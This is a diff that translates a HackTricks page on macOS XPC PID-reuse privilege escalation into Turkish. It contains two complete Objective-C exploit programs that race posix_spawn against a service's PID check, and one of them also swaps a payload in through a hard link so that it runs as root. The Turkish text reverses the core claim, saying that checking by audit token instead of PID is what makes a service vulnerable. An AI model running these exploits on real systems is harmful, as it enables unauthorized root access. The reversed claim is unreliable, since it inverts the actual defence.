@@ -1,40 +1,39 @@
-# macOS PID Reuse
+# macOS PID Yeniden Kullanımı
 
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sıfırdan kahraman olmak için AWS hackleme öğrenin<strong>!</strong></summary>
 
-Other ways to support HackTricks:
+HackTricks'i desteklemenin diğer yolları:
 
-* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Şirketinizi HackTricks'te **reklamınızı görmek** veya **HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
+* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
+* Özel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluşan koleksiyonumuz [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'i keşfedin
+* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)'u **takip edin**.
+* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına **PR göndererek** paylaşın.
 
 </details>
 
-## PID Reuse
+## PID Yeniden Kullanımı
 
-When a macOS **XPC service** is checking the called process based on the **PID** and not on the **audit token**, it's vulnerable to PID reuse attack. This attack is based on a **race condition** where an **exploit** is going to **send messages to the XPC** service **abusing** the functionality and just **after** that, executing **`posix_spawn(NULL, target_binary, NULL, &attr, target_argv, environ)`** with the **allowed** binary.
+Bir macOS **XPC servisi**, **PID** yerine **denetim belirtisi**ne dayalı olarak çağrılan işlemi kontrol ediyorsa, PID yeniden kullanım saldırısına karşı savunmasızdır. Bu saldırı, bir **yarış durumu**na dayanan bir **sömürü**ye dayanır, burada bir **sömürü**, işlevselliği **kötüye kullanarak XPC** servisine **mesajlar gönderecek** ve **ardından** izin verilen ikiliyi çalıştırmak için **`posix_spawn(NULL, target_binary, NULL, &attr, target_argv, environ)`**'ı yürütecektir.
 
-This function will make the **allowed binary own the PID** but the **malicious XPC message would have been sent** just before. So, if the **XPC** service **use** the **PID** to **authenticate** the sender and checks it **AFTER** the execution of **`posix_spawn`**, it will think it comes from an **authorized** process.
+Bu işlev, **izin verilen ikiliyi PID'ye sahip** yapacak, ancak **zararlı XPC mesajı** daha önce gönderilmiş olacaktır. Bu nedenle, XPC servisi, göndereni **kimlik doğrulamak** için **PID**'yi kullanıyorsa ve **`posix_spawn`**'ın yürütülmesinden **SONRA** kontrol ediyorsa, bunun yetkilendirilmiş bir işlemden geldiğini düşünecektir.
 
-### Exploit example
+### Sömürü örneği
 
-If you find the function **`shouldAcceptNewConnection`** or a function called by it **calling** **`processIdentifier`** and not calling **`auditToken`**. It highly probable means that it's **verifying the process PID** and not the audit token.\
-Like for example in this image (taken from the reference):
+Eğer **`shouldAcceptNewConnection`** işlevini veya onun tarafından çağrılan bir işlevi **`processIdentifier`**'ı çağırırken ve **`auditToken`**'ı çağırmazken bulursanız, büyük olasılıkla işlem PID'sini doğruluyor demektir.\
+Örneğin bu referanstan alınan görüntüde olduğu gibi:
 
 <figure><img src="../../../../../../.gitbook/assets/image (4) (1) (1) (1) (2).png" alt="https://wojciechregula.blog/images/2020/04/pid.png"><figcaption></figcaption></figure>
 
-Check this example exploit (again, taken from the reference) to see the 2 parts of the exploit:
+Bu örnek sömürüyü (yine referanstan alınan) görmek için kontrol edin:
 
-* One that **generates several forks**
-* **Each fork** will **send** the **payload** to the XPC service while executing **`posix_spawn`** just after sending the message.
+* Birçok çatallama oluşturan
+* **Her çatallama**, mesajı gönderdikten hemen sonra **`posix_spawn`**'ı çalıştırırken **payload**'ı XPC servisine **gönderecektir**.
 
 {% hint style="danger" %}
-For the exploit to work it's important to `export`` `**`OBJC_DISABLE_INITIALIZE_FORK_SAFETY=YES`** or to put inside the exploit:
-
+Sömürünün çalışması için `export`` `**`OBJC_DISABLE_INITIALIZE_FORK_SAFETY=YES`** veya sömürüye içine yerleştirilmesi önemlidir:
 ```objectivec
 asm(".section __DATA,__objc_fork_ok\n"
 "empty:\n"
@@ -44,8 +43,7 @@ asm(".section __DATA,__objc_fork_ok\n"
 
 {% tabs %}
 {% tab title="NSTasks" %}
-First option using **`NSTasks`** and argument to launch the children to exploit the RC
-
+RC'yi sömürmek için çocukları başlatmak için **`NSTasks`** ve argüman kullanarak ilk seçenek
 ```objectivec
 // Code from https://wojciechregula.blog/post/learn-xpc-exploitation-part-2-say-no-to-the-pid/
 // gcc -framework Foundation expl.m -o expl
@@ -92,70 +90,67 @@ extern char **environ;
 
 void child() {
 
-    // send the XPC messages
-    NSXPCInterface *remoteInterface = [NSXPCInterface interfaceWithProtocol:@protocol(ProtectionService)];
-    NSXPCConnection *xpcConnection = [[NSXPCConnection alloc] initWithMachServiceName:MACH_SERVICE options:NSXPCConnectionPrivileged];
-    xpcConnection.remoteObjectInterface = remoteInterface;
+// send the XPC messages
+NSXPCInterface *remoteInterface = [NSXPCInterface interfaceWithProtocol:@protocol(ProtectionService)];
+NSXPCConnection *xpcConnection = [[NSXPCConnection alloc] initWithMachServiceName:MACH_SERVICE options:NSXPCConnectionPrivileged];
+xpcConnection.remoteObjectInterface = remoteInterface;
 
-    [xpcConnection resume];
-    [xpcConnection.remoteObjectProxy restartOS];
+[xpcConnection resume];
+[xpcConnection.remoteObjectProxy restartOS];
 
-    char target_binary[] = BINARY;
-    char *target_argv[] = {target_binary, NULL};
-    posix_spawnattr_t attr;
-    posix_spawnattr_init(&attr);
-    short flags;
-    posix_spawnattr_getflags(&attr, &flags);
-    flags |= (POSIX_SPAWN_SETEXEC | POSIX_SPAWN_START_SUSPENDED);
-    posix_spawnattr_setflags(&attr, flags);
-    posix_spawn(NULL, target_binary, NULL, &attr, target_argv, environ);
+char target_binary[] = BINARY;
+char *target_argv[] = {target_binary, NULL};
+posix_spawnattr_t attr;
+posix_spawnattr_init(&attr);
+short flags;
+posix_spawnattr_getflags(&attr, &flags);
+flags |= (POSIX_SPAWN_SETEXEC | POSIX_SPAWN_START_SUSPENDED);
+posix_spawnattr_setflags(&attr, flags);
+posix_spawn(NULL, target_binary, NULL, &attr, target_argv, environ);
 }
 
 bool create_nstasks() {
 
-    NSString *exec = [[NSBundle mainBundle] executablePath];
-    NSTask *processes[RACE_COUNT];
+NSString *exec = [[NSBundle mainBundle] executablePath];
+NSTask *processes[RACE_COUNT];
 
-    for (int i = 0; i < RACE_COUNT; i++) {
-        processes[i] = [NSTask launchedTaskWithLaunchPath:exec arguments:@[ @"imanstask" ]];
-    }
+for (int i = 0; i < RACE_COUNT; i++) {
+processes[i] = [NSTask launchedTaskWithLaunchPath:exec arguments:@[ @"imanstask" ]];
+}
 
-    int i = 0;
-    struct timespec ts = {
-        .tv_sec = 0,
-        .tv_nsec = 500 * 1000000,
-    };
+int i = 0;
+struct timespec ts = {
+.tv_sec = 0,
+.tv_nsec = 500 * 1000000,
+};
 
-    nanosleep(&ts, NULL);
-    if (++i > 4) {
-        for (int i = 0; i < RACE_COUNT; i++) {
-            [processes[i] terminate];
-        }
-        return false;
-    }
+nanosleep(&ts, NULL);
+if (++i > 4) {
+for (int i = 0; i < RACE_COUNT; i++) {
+[processes[i] terminate];
+}
+return false;
+}
 
-    return true;
+return true;
 }
 
 int main(int argc, const char * argv[]) {
 
-    if(argc > 1) {
-        // called from the NSTasks
-        child();
+if(argc > 1) {
+// called from the NSTasks
+child();
 
-    } else {
-        NSLog(@"Starting the race");
-        create_nstasks();
-    }
+} else {
+NSLog(@"Starting the race");
+create_nstasks();
+}
 
-    return 0;
+return 0;
 }
 ```
-{% endtab %}
-
 {% tab title="fork" %}
-This example uses a raw **`fork`** to launch **children that will exploit the PID race condition** and then exploit **another race condition via a Hard link:**
-
+Bu örnek, PID yarış koşulunu sömüren çocukları başlatmak için bir **`fork`** kullanır ve ardından bir Hard link üzerinden **başka bir yarış koşulunu sömürür:**
 ```objectivec
 // export OBJC_DISABLE_INITIALIZE_FORK_SAFETY=YES
 // gcc -framework Foundation expl.m -o expl
@@ -173,139 +168,139 @@ This example uses a raw **`fork`** to launch **children that will exploit the PI
 bool pwned = false;
 
 /**
- * Continuously overwrite the contents of the 'hard_link' file in a race condition to make the 
- * XPC service verify the legit binary and then execute as root out payload.
- */
+* Continuously overwrite the contents of the 'hard_link' file in a race condition to make the
+* XPC service verify the legit binary and then execute as root out payload.
+*/
 void *check_race(void *arg) {
-    while(!pwned) {
-        // Overwrite with contents of the legit binary
-        system("cat ./legit_bin > hard_link");
-        usleep(50000);
+while(!pwned) {
+// Overwrite with contents of the legit binary
+system("cat ./legit_bin > hard_link");
+usleep(50000);
 
-        // Overwrite with contents of the payload to execute
-        // TODO: COMPILE YOUR OWN PAYLOAD BIN
-        system("cat ./payload > hard_link");
-        usleep(50000);
-    }
-    return NULL;
+// Overwrite with contents of the payload to execute
+// TODO: COMPILE YOUR OWN PAYLOAD BIN
+system("cat ./payload > hard_link");
+usleep(50000);
+}
+return NULL;
 }
 
 void child_xpc_pid_rc_abuse(){
-    // TODO: INDICATE A VALID BIN TO BYPASS SIGN VERIFICATION
-    #define kValid "./Legit Updater.app/Contents/MacOS/Legit"
-    extern char **environ;
+// TODO: INDICATE A VALID BIN TO BYPASS SIGN VERIFICATION
+#define kValid "./Legit Updater.app/Contents/MacOS/Legit"
+extern char **environ;
 
-    // Connect with XPC service
-    // TODO: CHANGE THE ID OF THE XPC TO EXPLOIT
-    NSString*  service_name = @"com.example.Helper";
-    NSXPCConnection* connection = [[NSXPCConnection alloc] initWithMachServiceName:service_name options:0x1000];
-    // TODO: CNAGE THE PROTOCOL NAME
-    NSXPCInterface* interface = [NSXPCInterface interfaceWithProtocol:@protocol(HelperProtocol)];
-    [connection setRemoteObjectInterface:interface];
-    [connection resume];
+// Connect with XPC service
+// TODO: CHANGE THE ID OF THE XPC TO EXPLOIT
+NSString*  service_name = @"com.example.Helper";
+NSXPCConnection* connection = [[NSXPCConnection alloc] initWithMachServiceName:service_name options:0x1000];
+// TODO: CNAGE THE PROTOCOL NAME
+NSXPCInterface* interface = [NSXPCInterface interfaceWithProtocol:@protocol(HelperProtocol)];
+[connection setRemoteObjectInterface:interface];
+[connection resume];
 
-    id obj = [connection remoteObjectProxyWithErrorHandler:^(NSError* error) {
-        NSLog(@"[-] Something went wrong");
-        NSLog(@"[-] Error: %@", error);
-    }];
+id obj = [connection remoteObjectProxyWithErrorHandler:^(NSError* error) {
+NSLog(@"[-] Something went wrong");
+NSLog(@"[-] Error: %@", error);
+}];
 
-    NSLog(@"obj: %@", obj);
-    NSLog(@"conn: %@", connection);
+NSLog(@"obj: %@", obj);
+NSLog(@"conn: %@", connection);
 
-    // Call vulenrable XPC function
-    // TODO: CHANEG NAME OF FUNCTION TO CALL
-    [obj DoSomething:^(_Bool b){
-        NSLog(@"Response, %hdd", b);
-    }];
+// Call vulenrable XPC function
+// TODO: CHANEG NAME OF FUNCTION TO CALL
+[obj DoSomething:^(_Bool b){
+NSLog(@"Response, %hdd", b);
+}];
 
-    // Change current process to the legit binary suspended
-    char target_binary[] = kValid;
-    char *target_argv[] = {target_binary, NULL};
-    posix_spawnattr_t attr;
-    posix_spawnattr_init(&attr);
-    short flags;
-    posix_spawnattr_getflags(&attr, &flags);
-    flags |= (POSIX_SPAWN_SETEXEC | POSIX_SPAWN_START_SUSPENDED);
-    posix_spawnattr_setflags(&attr, flags);
-    posix_spawn(NULL, target_binary, NULL, &attr, target_argv, environ);
+// Change current process to the legit binary suspended
+char target_binary[] = kValid;
+char *target_argv[] = {target_binary, NULL};
+posix_spawnattr_t attr;
+posix_spawnattr_init(&attr);
+short flags;
+posix_spawnattr_getflags(&attr, &flags);
+flags |= (POSIX_SPAWN_SETEXEC | POSIX_SPAWN_START_SUSPENDED);
+posix_spawnattr_setflags(&attr, flags);
+posix_spawn(NULL, target_binary, NULL, &attr, target_argv, environ);
 }
 
 /**
- * Function to perform the PID race condition using children calling the XPC exploit.
- */
+* Function to perform the PID race condition using children calling the XPC exploit.
+*/
 void xpc_pid_rc_abuse() {
-    #define RACE_COUNT 1
-    extern char **environ;
-    int pids[RACE_COUNT];
+#define RACE_COUNT 1
+extern char **environ;
+int pids[RACE_COUNT];
 
-    // Fork child processes to exploit
-    for (int i = 0; i < RACE_COUNT; i++) {
-        int pid = fork();
-        if (pid == 0) {  // If a child process
-            child_xpc_pid_rc_abuse();
-        }
-        printf("forked %d\n", pid);
-        pids[i] = pid;
-    }
+// Fork child processes to exploit
+for (int i = 0; i < RACE_COUNT; i++) {
+int pid = fork();
+if (pid == 0) {  // If a child process
+child_xpc_pid_rc_abuse();
+}
+printf("forked %d\n", pid);
+pids[i] = pid;
+}
 
-    // Wait for children to finish their tasks
-    sleep(3);
+// Wait for children to finish their tasks
+sleep(3);
 
-    // Terminate child processes
-    for (int i = 0; i < RACE_COUNT; i++) {
-        if (pids[i]) {
-            kill(pids[i], 9);
-        }
-    }
+// Terminate child processes
+for (int i = 0; i < RACE_COUNT; i++) {
+if (pids[i]) {
+kill(pids[i], 9);
+}
+}
 }
 
 int main(int argc, const char * argv[]) {
-    // Create and set execution rights to 'hard_link' file
-    system("touch hard_link");
-    system("chmod +x hard_link");
-    
-    // Create thread to exploit sign verification RC
-    pthread_t thread;
-    pthread_create(&thread, NULL, check_race, NULL);
+// Create and set execution rights to 'hard_link' file
+system("touch hard_link");
+system("chmod +x hard_link");
 
-    while(!pwned) {
-        // Try creating 'download' directory, ignore errors
-        system("mkdir download 2>/dev/null");
+// Create thread to exploit sign verification RC
+pthread_t thread;
+pthread_create(&thread, NULL, check_race, NULL);
 
-        // Create a hardlink
-        // TODO: CHANGE NAME OF FILE FOR SIGN VERIF RC
-        system("ln hard_link download/legit_bin");
+while(!pwned) {
+// Try creating 'download' directory, ignore errors
+system("mkdir download 2>/dev/null");
 
-        xpc_pid_rc_abuse();
-        usleep(10000);
+// Create a hardlink
+// TODO: CHANGE NAME OF FILE FOR SIGN VERIF RC
+system("ln hard_link download/legit_bin");
 
-        // The payload will generate this file if exploitation is successfull
-        if (access("/tmp/pwned", F_OK ) == 0) {
-            pwned = true;
-        }
-    }
+xpc_pid_rc_abuse();
+usleep(10000);
 
-    return 0;
+// The payload will generate this file if exploitation is successfull
+if (access("/tmp/pwned", F_OK ) == 0) {
+pwned = true;
+}
+}
+
+return 0;
 }
 ```
 {% endtab %}
 {% endtabs %}
 
-## Refereces
+## Referanslar
 
 * [https://wojciechregula.blog/post/learn-xpc-exploitation-part-2-say-no-to-the-pid/](https://wojciechregula.blog/post/learn-xpc-exploitation-part-2-say-no-to-the-pid/)
 * [https://saelo.github.io/presentations/warcon18\_dont\_trust\_the\_pid.pdf](https://saelo.github.io/presentations/warcon18\_dont\_trust\_the\_pid.pdf)
 
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>AWS hackleme konusunda sıfırdan kahramana dönüşmek için</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>'ı öğrenin!</strong></summary>
 
-Other ways to support HackTricks:
+HackTricks'i desteklemenin diğer yolları:
 
-* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Şirketinizi HackTricks'te **reklamınızı görmek veya HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
+* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
+* Özel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluşan koleksiyonumuz olan [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keşfedin
+* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)'u **takip edin**.
+* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna **PR göndererek** paylaşın.
 
 </details>
